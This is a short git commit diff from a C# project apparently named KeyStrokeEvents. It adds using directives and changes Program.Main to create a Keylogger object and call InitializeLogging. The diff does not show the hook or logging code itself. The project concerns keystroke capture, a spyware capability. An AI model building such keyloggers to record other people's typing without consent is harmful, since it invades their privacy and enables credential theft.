65640ddab3a454818672144f530d933610d16cee
דוד שוסטרמן < >
2016-12-16 22:41:43 +0200

    fixed code organization

--- KeyStrokeEvents/BL/KeyboardHooks/KeyboardHook.cs
+++ KeyStrokeEvents/BL/KeyboardHooks/KeyboardHook.cs
@@ -2,7 +2,9 @@ using System;
 using System.Collections.Generic;
 using System.Text;
 using System.Runtime.InteropServices;
-
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+using System.Windows.Input;
 
 namespace KeyStrokeEvents
 {
--- KeyStrokeEvents/Program.cs
+++ KeyStrokeEvents/Program.cs
@@ -1,15 +1,26 @@
-﻿using System;
+﻿using System;   
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Runtime.CompilerServices;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace KeyStrokeEvents
 {
     class Program
     {
+        
         static void Main(string[] args)
         {
+            Keylogger keyLogger = new Keylogger();
+            keyLogger.InitializeLogging();
         }
+
+        
     }
 }
